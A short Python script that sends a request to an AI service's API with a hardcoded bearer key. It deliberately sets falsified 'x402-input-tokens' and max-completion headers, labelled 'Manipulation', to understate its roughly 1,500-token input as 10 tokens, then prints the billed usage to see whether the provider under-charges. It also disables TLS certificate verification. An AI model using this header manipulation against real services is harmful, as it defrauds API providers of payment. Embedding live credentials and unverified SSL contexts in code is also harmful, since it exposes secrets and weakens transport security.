import http.client
import json
import ssl

api_key = "Fc3AKqrXJRn5fgFmEIKWPARp2qDWaGKeqLv5yXto9eWII74szl"
host = "api.ambient.xyz"
path = "/v1/responses"

def economic_test():
    # Long input but lying in headers? 
    # Note: Use direct V2 API which might use these headers in a relayer
    input_text = "Repeat this 10 times: Hello world. " * 50 # Length ~ 1000+ chars
    
    payload = {
        "model": "large",
        "input": input_text,
        "stream": False,
        "emit_usage": True
    }
    
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
        # Manipulation: Saying we only have 10 input tokens when we have ~1500
        "x402-input-tokens": "10",
        "x402-max-completion-tokens": "50"
    }
    
    context = ssl._create_unverified_context()
    conn = http.client.HTTPSConnection(host, context=context)
    conn.request("POST", path, body=json.dumps(payload), headers=headers)
    response = conn.getresponse()
    print(f"Status: {response.status}")
    data = response.read().decode("utf-8")
    
    try:
        res = json.loads(data)
        if "usage" in res:
            print(f"Billed Usage: {res.get('usage')}")
            # If the API key covers usage, check if it recorded 10 or 1500
    except:
        print(f"Raw Data: {data}")

if __name__ == "__main__":
    economic_test()
